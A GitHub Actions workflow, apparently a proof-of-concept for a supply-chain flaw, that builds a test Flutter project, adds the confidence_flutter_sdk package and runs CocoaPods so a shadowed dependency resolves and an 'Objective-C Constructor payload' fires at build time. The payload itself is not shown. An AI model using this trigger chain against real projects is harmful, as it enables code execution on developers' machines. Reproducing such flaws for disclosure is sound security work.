name: Supply Chain RCE Proof
on: [push, workflow_dispatch]

jobs:
  simulate-developer-machine:
    runs-on: macos-latest
    
    steps:
      - name: Setup Flutter
        uses: subosito/flutter-action@v2
        with:
          channel: 'stable'

      - name: Simulate Official Integration Guide
        run: |
          # 1. Create a dummy project
          flutter create rce_test
          cd rce_test
          
          # 2. Patch Podfile to match your podspec version (iOS 14.0)
          sed -i '' "s/platform :ios, '13.0'/platform :ios, '14.0'/" ios/Podfile
          
          # 3. Add the package
          flutter pub add confidence_flutter_sdk
          
          # 4. Trigger the shadowed resolution
          cd ios
          pod repo update
          pod install --verbose
          
          # 5. Build to trigger the Objective-C Constructor payload
          cd ..
          flutter build ios --no-codesign
